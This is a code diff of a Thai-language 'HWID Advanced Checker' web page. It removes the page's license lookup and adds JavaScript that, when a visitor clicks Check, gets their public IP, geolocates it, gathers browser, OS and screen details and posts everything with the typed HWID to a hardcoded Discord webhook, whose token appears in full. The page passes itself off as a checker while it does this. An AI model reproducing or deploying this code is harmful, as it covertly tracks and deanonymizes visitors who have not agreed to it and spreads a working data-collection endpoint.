@@ -1,137 +1,70 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>HWID Advanced Checker</title>
-  <style>
-    body {
-      font-family: Arial;
-      background: linear-gradient(135deg,#0f172a,#020617);
-      color: white;
-      text-align: center;
-      padding: 50px;
-    }
-
-    input {
-      padding: 12px;
-      width: 400px;
-      border-radius: 12px;
-      border: none;
-      outline: none;
-    }
-
-    button {
-      padding: 12px 25px;
-      margin-left: 10px;
-      border-radius: 12px;
-      border: none;
-      cursor: pointer;
-      background: #22c55e;
-      color: white;
-      font-weight: bold;
-    }
-
-    .card {
-      margin-top: 30px;
-      background: #1e293b;
-      padding: 25px;
-      border-radius: 20px;
-      width: 400px;
-      margin-left: auto;
-      margin-right: auto;
-      text-align: left;
-      box-shadow: 0 0 25px rgba(0,0,0,0.5);
-      animation: fade 0.4s ease;
-    }
-
-    .title {
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
-
-    .ok { color: #22c55e; }
-    .fail { color: #ef4444; }
-
-    @keyframes fade {
-      from {opacity:0; transform: translateY(10px);}
-      to {opacity:1; transform: translateY(0);}
-    }
-  </style>
-</head>
-<body>
-
-<h1>🔐 HWID Advanced Checker</h1>
-
-<input id="hwid" placeholder="Enter HWID..." />
-<button onclick="check()">Check</button>
-
-<div id="result"></div>
-
 <script>
-function getDaysLeft(date) {
-  const now = new Date();
-  const end = new Date(date);
-  const diff = end - now;
-  return Math.floor(diff / (1000 * 60 * 60 * 24));
+async function getIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "unknown";
+  }
+}
+
+async function getGeo(ip) {
+  try {
+    const res = await fetch(`https://ipapi.co/${ip}/json/`);
+    return await res.json();
+  } catch {
+    return {};
+  }
+}
+
+async function sendToDiscord(data) {
+  const webhook = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
+
+  await fetch(webhook, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      embeds: [{
+        title: "🧠 USER DATA",
+        color: 0x00ffcc,
+        fields: [
+          { name: "HWID (input)", value: data.hwid || "none" },
+          { name: "IP", value: data.ip },
+          { name: "Country", value: data.country },
+          { name: "City", value: data.city },
+          { name: "Browser", value: data.browser },
+          { name: "OS", value: data.os },
+          { name: "Screen", value: data.screen },
+          { name: "UserAgent", value: data.ua }
+        ],
+        timestamp: new Date()
+      }]
+    })
+  });
 }
 
 async function check() {
-  const hwid = document.getElementById("hwid").value;
+  const hwid = document.getElementById("hwid").value.trim();
 
-  const res = await fetch("hwid.json");
-  const data = await res.json();
+  const ip = await getIP();
+  const geo = await getGeo(ip);
 
-  const user = data.users[hwid];
+  const data = {
+    hwid: hwid,
+    ip: ip,
+    country: geo.country_name || "unknown",
+    city: geo.city || "unknown",
+    browser: navigator.userAgent,
+    os: navigator.platform,
+    screen: screen.width + "x" + screen.height,
+    ua: navigator.userAgent
+  };
 
-  if (user) {
-    const days = getDaysLeft(user.expire);
+  document.getElementById("result").innerText = "ส่งข้อมูลแล้ว ✅";
 
-    document.getElementById("result").innerHTML = `
-      <div class="card">
-        <div class="title ok">✅ พบข้อมูล</div>
-
-        <p><b>HWID:</b> ${hwid}</p>
-        <p><b>ชื่อ:</b> ${user.name}</p>
-        <p><b>UID:</b> ${user.uid}</p>
-        <p><b>Discord:</b> ${user.discord}</p>
-
-        <hr>
-
-        <p><b>สถานะ:</b> ${user.status}</p>
-        <p><b>Role:</b> ${user.role}</p>
-        <p><b>แบน:</b> ${user.banned ? "YES ❌" : "NO ✅"}</p>
-
-        <hr>
-
-        <p><b>สร้างเมื่อ:</b> ${user.created}</p>
-        <p><b>หมดอายุ:</b> ${user.expire}</p>
-        <p><b>เหลือ:</b> ${days} วัน</p>
-
-        <hr>
-
-        <p><b>เข้าใช้งานล่าสุด:</b> ${user.last_login}</p>
-        <p><b>จำนวนครั้งใช้งาน:</b> ${user.usage_count}</p>
-
-        <hr>
-
-        <p><b>IP:</b> ${user.ip}</p>
-        <p><b>ประเทศ:</b> ${user.country}</p>
-        <p><b>อุปกรณ์:</b> ${user.device}</p>
-
-        <hr>
-
-        <p><b>หมายเหตุ:</b> ${user.note}</p>
-      </div>
-    `;
-  } else {
-    document.getElementById("result").innerHTML = `
-      <div class="card">
-        <div class="title fail">❌ ไม่พบข้อมูล</div>
-        <p>HWID นี้ไม่มีในระบบ</p>
-      </div>
-    `;
-  }
+  await sendToDiscord(data);
 }
 </script>
-
-</body>
-</html>
